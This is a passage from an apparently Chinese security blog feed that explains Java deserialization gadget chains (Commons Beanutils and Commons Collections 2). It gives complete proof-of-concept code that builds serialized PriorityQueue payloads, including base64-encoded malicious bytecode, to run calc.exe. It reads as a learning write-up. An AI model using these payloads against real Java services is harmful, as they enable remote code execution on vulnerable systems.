field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        BeanComparator comparator = <span class="keyword">new</span> BeanComparator();</span><br><span class="line">        Queue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;obj, obj&#125;);</span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/09/kmSJZyEXFxjAaL3.png" alt="image.png"></p><p>成功弹出计算器，下一篇文章来介绍用这条cb链来打<code>shiro</code>哈</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Commons-Beanutils&quot;&gt;&lt;a href=&quot;#Commons-Beanutils&quot; class=&quot;headerlink&quot; title=&quot;Commons Beanutils&quot;&gt;&lt;/a&gt;Commons Beanutils&lt;/h1&gt;&lt;p&gt;前面我们讲完了cc链，接下来我们就开始cb链了，也就是&lt;code&gt;Commons Beanutils&lt;/code&gt;，还好它只有一条链子，也要用到我们前面介绍过的&lt;code&gt;java.util.PriorityQueue&lt;/code&gt;类&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇Commons Collections 2</title>
    <link href="https://arsenetang.github.io/2022/03/07/Java%E7%AF%87%E4%B9%8BCommonsCollections%202/"/>
    <id>https://arsenetang.github.io/2022/03/07/Java%E7%AF%87%E4%B9%8BCommonsCollections%202/</id>
    <published>2022-03-06T16:00:00.000Z</published>
    <updated>2022-03-07T13:58:54.715Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Commons-Collections-2"><a href="#Commons-Collections-2" class="headerlink" title="Commons Collections 2"></a>Commons Collections 2</h1><p>前面我们讲的cc链，都是基于<code>commons-collections:commons-collections</code>这个版本的，当时的版本号是3.2.1，也就是老版本；但后来实际上又有了新的分支，版本号为4.0，接下来我们就来看看在这个版本中存在的反序列化漏洞</p><span id="more"></span><p>这个新版本就是<code>org.apache.commons:commons-collections4</code>，<code>groupId</code>和<code>artifactId</code>都变了，为什么会分成两个不同的分支呢？因为当时官方认为旧的<code>commons-collections</code>有⼀些架构和<code>API</code>设计上的问题，但修复这些问题，会产⽣⼤量不能兼容的改动；所以说，<code>commons-collections4</code>不是用来替换<code>commons-collections</code>的一个新版本，而是一个新的包，两者的命名空间并不冲突，都可以放在同一个项目中，相当于就是一个拓展，那么之前版本中能利用的反序列化链，到了新版本中还能用吗？</p><h2 id="commons-collections4中有啥改动"><a href="#commons-collections4中有啥改动" class="headerlink" title="commons-collections4中有啥改动"></a>commons-collections4中有啥改动</h2><p>由于这两个版本可以共存，所以说我们就可以把它们两个包安装到同一个项目中进行比较，<code>ysoserial</code>中都装了，所以说直接在里面写POC就很方便，我们就拿cc6来演示嘛，毕竟这是一条通用链子，先把包名改改，把<code>import org.apache.commons.collections.*</code>改成<code>import org.apache.commons.collections4.*</code>如下图：</p><p><img src="https://s2.loli.net/2022/03/07/Z2sO8DgiElqymN4.png" alt="image.png"></p><p>这时候就会出现一个报错，因为<code>collections4</code>中的<code>LazyMap</code>里面并没有<code>decorate</code>这个方法，而是改了个名字，改成了<code>lazymap</code>，其它都是一样的，咱换个名字就能用了：<code>Map outerMap = LazyMap.lazyMap(innerMap, transformerChain);</code></p><p><img src="https://s2.loli.net/2022/03/07/feFsqMNp8WPA3cJ.png" alt="image.png"></p><p>成功弹出了计算器，说明了老的cc1、cc3、cc6都可以在新的<code>collections4</code>上继续使用</p><h2 id="PriorityQueue利⽤链"><a href="#PriorityQueue利⽤链" class="headerlink" title="PriorityQueue利⽤链"></a>PriorityQueue利⽤链</h2><p>除了几个老的以外，<code>ysoserial</code>还为<code>collections4</code>准备了几条新的利用链，那就是<code>CommonsCollections2</code>和<code>CommonsCollections4</code>，这两条链都是基于新的<code>collections4</code>特有的，但其实原理其实和前面的也差不了太多；前面分析了那么多链子，我们现在应该对cc链有概念了，cc链的核心，毫无疑问是<code>Transformer#transform()</code>，我们得想办法调入<code>transform</code>中，在里面去执行命令；而cc链的入口，就是<code>Serializable#readObject() </code>，所以说我们要做的，就是想办法把它们头尾连起来</p><p>而在<code>CommonsCollections2</code>中，有两个核心类，也就是链子的一头一尾：</p><p>一个是<code>java.util.PriorityQueue</code>，这个类中有自己的<code>readObject()</code>方法，所以说可以作为链子的开头：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而另一个是<code>org.apache.commons.collections4.comparators.TransformingComparator</code>，这个类中有调用<code>transform()</code>方法的函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="keyword">final</span> O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那这里就是链子的结尾，这条链子就是从<code>PriorityQueue</code>类中的<code>readObject()</code>方法到<code>TransformingComparator</code>类中的<code>compare()</code>方法；接下来我们就来看看它是怎么连接起来的：</p><p><code>PriorityQueue</code>类中的<code>readObject()</code>方法里面调用了<code>heapify()</code>，<code>heapify()</code>里面调用了<code>siftDown()</code>，<code>siftDown()</code>里面调用了<code>siftDownUsingComparator</code>，<code>siftDownUsingComparator</code>里面调用了<code>comparator.compare()</code>，就成功调用到上面<code>TransformingComparator</code>类中的<code>compare()</code>方法，这条链子就通了，整条链子简直不能再友好了，看看<code>siftDownUsingComparator</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">        &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面有些数据结构的知识看得我也挺头大的，还好和这条链子没有太大关系，但还是跟着p神的文章稍微学学吧</p><p><code>java.util.PriorityQueue</code>是一个优先队列(<code>Queue</code>)，基于二叉堆实现，优先队列每次出队的元素都是优先级最高的元素，那么如何确定哪一个元素的优先级最高呢？<code>jdk</code>中使用堆这种数据结构，通过堆使得每次出队的元素总是队列里面最小的，而元素大小的比较方法则由<code>comparator</code>指定，相当于指定优先级</p><p>二叉堆是一种特殊的堆，是完全二叉树或者近似于完全二叉树，二叉堆分为最大堆和最小堆；最大堆：父节点的键值总是大于或等于任何一个子节点的键值，最小堆：父节点的键值总是小于或等于任何一个子节点的键值；而完全二叉树在第n层深度被填满之前，不会开始填第n+1层，而且元素插入是从左往右填满；所以说基于数组实现的二叉堆，对于数组中任意位置的n元素，其左孩子在[2n+1]位置上，右孩子在[2(n+1)]位置，它的父亲则在[(n-1)/2]上，而根的位置则是[0]，具体的请见：&lt;<a href="https://www.cnblogs.com/linghu-java/p/9467805.html">PriorityQueue源码分析 - linghu_java - 博客园 </a>&gt;</p><p>反序列化之后之所以要调用<code>heapify()</code>方法，是为了反序列化之后恢复顺序，相当于就是排序，而排序是靠将大的元素下移实现的，而将节点下移的函数就是<code>siftDown() </code>，而<code>comparator.compare()</code>⽤来⽐较两个元素⼤⼩</p><p><code>TransformingComparator</code>类实现了<code>java.util.Comparator</code>接⼝，这个接⼝⽤于定义两个对象如何⽐较；<code>siftDownUsingComparator()</code> 中就使⽤这个接⼝的<code>compare()</code>⽅法⽐较树的节点</p><p>差不多就是这样，但其实我感觉这和我们后面构造利用链基本上没有关系，大家了解就好</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>首先还是经典的<code>Transformer</code>，和之前的都一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] faketransfromer = <span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(faketransfromer);</span><br></pre></td></tr></table></figure><p>然后把这个<code>ChainedTransformer</code>对象放入到创建的<code>TransformingComparator</code>对象里面：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Comparator comparator = <span class="keyword">new</span> TransformingComparator(transformerChain);</span><br></pre></td></tr></table></figure><p>然后再将这个<code>TransformingComparator</code>对象放入<code>PriorityQueue</code>中，它的构造方法中有两个参数，第一个参数是初始化时的大小，至少需要两个元素才能触发排序和比较，所以说一般来讲是2，当然比2大的任何整数都行；第⼆个参数是⽐较时的<code>Comparator</code>，传⼊前⾯实例化的<code>comparator</code>就行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Queue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>后面随便添加两个非null的任意对象就行，这里就传两个数字进去比较简单，这个不重要哈哈哈</p><p>然后把真正恶意的<code>Transformer</code>放上去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(transformerChain,<span class="string">&quot;iTransformers&quot;</span>,transformer);</span><br></pre></td></tr></table></figure><p>最后后面跟上序列化和反序列化的操作就行了，完整POC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.Reflections.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] faketransfromer = <span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(faketransfromer);</span><br><span class="line">        Comparator comparator = <span class="keyword">new</span> TransformingComparator(transformerChain);</span><br><span class="line">        Queue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        setFieldValue(transformerChain,<span class="string">&quot;iTransformers&quot;</span>,transformer);</span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/07/CKlhxA4dzmGNTpS.png" alt="image.png"></p><p>成功弹出计算器</p><h2 id="改造POC"><a href="#改造POC" class="headerlink" title="改造POC"></a>改造POC</h2><p>前面我们提到了构造不含数组的POC，并且用那个打了<code>Shiro</code>，那么我们能不能把那个POC拿来改造成这种呢？肯定是可以的，而且和前面讲的也差不多，首先创建<code>TemplatesImpl</code>对象，然后创造一个人畜无害的<code>transformer</code>，里面随便调用一个方法就行，比如说<code>toString</code>，然后就和上面一样实例化<code>TransformingComparator</code>和<code>PriorityQueue</code>对象，但是这里我们得向队列中添加我们前面创建的<code>TemplatesImpl</code>对象，因为我们不能用数组了，所以说没办法通过<code>ConstantTransformer</code>把对象传进来了，⽽在<code>Comparator#compare()</code> 时，队列⾥的元素将作为参数传⼊<code>transform()</code>⽅法，这就是传给<code>TemplatesImpl#newTransformer</code>的参数，相当于就执行<code>TemplatesImpl</code>对象里的<code>newTransformer()</code>方法</p><p>完整POC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2_2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        Comparator comparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        Queue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(obj);</span><br><span class="line">        queue.add(obj);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer,<span class="string">&quot;iMethodName&quot;</span>,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        </span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = 